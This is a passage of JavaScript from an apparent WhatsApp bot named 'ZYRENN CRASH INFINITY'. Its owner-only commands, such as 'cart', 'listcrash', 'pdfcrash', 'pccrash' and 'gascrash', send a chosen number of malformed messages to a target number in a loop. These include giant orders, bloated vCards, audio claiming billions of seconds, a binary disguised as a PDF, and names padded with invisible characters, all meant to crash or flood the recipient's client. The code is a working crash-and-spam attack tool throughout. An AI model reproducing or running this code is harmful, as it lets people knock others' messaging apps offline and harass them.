karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
zyren.sendContact(num, ownerNumber, `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`, fkontaak)
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case "cart": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${notif3}`,
"jpegThumbnail":fs.readFileSync("./media/gambarnye/deden.jpeg"),
"orderTitle": `${notif4}`,
"sellerJid": "6281991410940@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: trol })
zyren.relayMessage(num, order.message, { messageId: order.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case "listcrash":{
if (!isCreator) return
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `${place}`,
description: `𝐓𝐑𝐀𝐕𝐀 𝑳𝑰𝑺𝑻 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥`,
buttonText: `𝐂𝐋𝐈𝐂𝐊 ${buttonvirus}`,
footerText: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭`,
listType: "SINGLE_SELECT",
sections: [{
"title": "Menu Bug",
"rows": [
{
"title": `${ngazap(prefix)}`,
"description": "KK",
"rowId": `KK`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "KK",
"description": `${buttonvirus}`,
"rowId": `KK`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": `${cttl}`,
"description": "KK",
"rowId": `KK`
}
]
}
],
  listType: 1
}
}), { userJid: m.chat, quoted: ftroli })
zyren.relayMessage(num, template.message, { messageId: template.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case "virvid": 
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
 hey = fs.readFileSync("./media/gambarnye/kkk.mp4")
 zyren.sendMessage(num, {video: hey, adehvn, }, {quoted: ftrolii})
 }
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
break
//=================================================//
/*BUG WACAP */
case "pdfcrash":{
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
anuin = fs.readFileSync("./basetzy/virtex/ngeselin.BIN")
zyren.sendMessage(num, { document: anuin, mimetype: "application/pdf", fileName: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${place}.pdf`, title: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘.pdf` }, { quoted: pak })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
case "pccrash": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./media/gambarnye/thezyren.jpg") }, { upload: zyren.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `${ngazap(prefix)}`,
						"groupName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
						"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: trol })
zyren.relayMessage(num, groupInvite.message, { messageId: groupInvite.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
case "cttbusin": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   \nitem1.TEL;waid=6281991410940:+6281991410940\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩🔥\nX-WA-BIZ-NAME: Raditt\nEND:VCARD",
}
}), { userJid: m.chat, quoted: kon })
zyren.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
case "image": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(num, { image: { url: "https://telegra.ph/file/842cc1a7658a1c2b94c0c.jpg" }, caption: `🔥፝⃟ ꙳𝐏𝐚𝐤𝐓𝐳𝐲🔥፝⃟   ${ngazap(prefix)}` }, { quoted: ft })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
setReply(tekteka)
}
break
case "bugsticker": {
if (!isCreator) return onlyOwner()
if (args.length < 1) return setReply(`*Syntax Error!*\n\nUse : ${command} No|Amount spam|timer\nExample : ${command} 62xx@s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`)
num = q.split("|")[0]
jumlah = q.split("|")[1] 
for (let i = 0; i < jumlah; i++) {
zyren.sendMessage(num, { sticker: fs.readFileSync('./media/stickernye/istigfar.webp') }, { quoted: ftroli }) 
}
setReply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//=================================================//
/*BUG WACAP */
case "gascrash": {
if (!isCreator) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Zyren`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":""})
},
"message": {
"contactMessage": {
"displayName": "🔥 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🔥‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎